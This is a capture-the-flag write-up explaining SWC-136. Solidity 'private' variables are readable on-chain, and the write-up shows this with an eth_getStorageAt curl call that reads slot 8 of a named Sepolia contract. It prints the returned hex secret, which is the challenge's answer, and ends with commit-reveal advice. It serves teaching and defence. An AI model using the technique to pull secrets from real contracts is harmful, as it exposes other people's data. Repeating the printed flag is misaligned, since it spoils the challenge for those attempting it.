The challenge name gave the rest away: SWC-136. That's the Smart Contract Weakness Classification for "Unencrypted Private Data On-Chain" — a fundamental misunderstanding of what private means in Solidity. The developer chose a keyword they didn't fully understand, and we were here to prove it.

The Storage Layout

In the EVM, every state variable lives in a numbered storage slot. Slots are assigned sequentially, starting from 0, following the contract's inheritance chain. For SnackToken, which inherits ERC721 and Ownable, the layout looks like this:

Slot 0: _name (ERC721) Slot 1: _symbol (ERC721) Slot 2: _owners (ERC721, mapping) Slot 3: _balances (ERC721, mapping) Slot 4: _tokenApprovals (ERC721, mapping) Slot 5: _operatorApprovals (ERC721, mapping) Slot 6: _owner (Ownable) Slot 7: _nextTokenId (SnackToken) Slot 8: _secretPassphrase (SnackToken) ← TARGET Slot 9: _metadataBaseURI (SnackToken) Slot 10: _fragments (SnackToken)

The private keyword controls contract-level access — whether other Solidity contracts can call a getter function for that variable. It has absolutely zero effect on whether the data is readable. Every byte stored on-chain is public. You just need to know which slot to ask for.

The contract's mint function even confirmed the slot number in its own documentation: "bytes32 value read from slot 8 (Stage 1 solve)."

The Exploit

One call. That's all it takes. The JSON-RPC method eth_getStorageAt reads raw storage from any contract on any public blockchain. No authentication. No permissions. No special access. Just an address, a slot number, and a public RPC endpoint.

curl -s -X POST "https://ethereum-sepolia-rpc.publicnode.com" \ -H "Content-Type: application/json" \ -d '{ "jsonrpc": "2.0", "method": "eth_getStorageAt", "params": [ "0x666fC17e064224E3026DdF31B431eA30dFc3A561", "0x8", "latest" ], "id": 1 }'
{ "jsonrpc": "2.0", "id": 1, "result": "0x737430726167335f69735f6e337633725f707231766174330000000000000000" }

Why This Matters

SWC-136 is not academic. Real contracts have stored real secrets this way — passwords, private keys, configuration values — and real money has been lost because developers confused access modifiers with encryption. The Ethereum blockchain is a public ledger. Every transaction, every state change, every byte of storage is replicated across thousands of nodes worldwide. Marking something private is a visibility modifier for the Solidity compiler, not a security mechanism.

If you need to store a secret on-chain, you don't. You store a commitment — a hash of the secret combined with a salt. The actual secret never touches the blockchain until it needs to be revealed. This is the pattern behind commit-reveal schemes, sealed-bid auctions, and any on-chain mechanism that requires temporary secrecy.
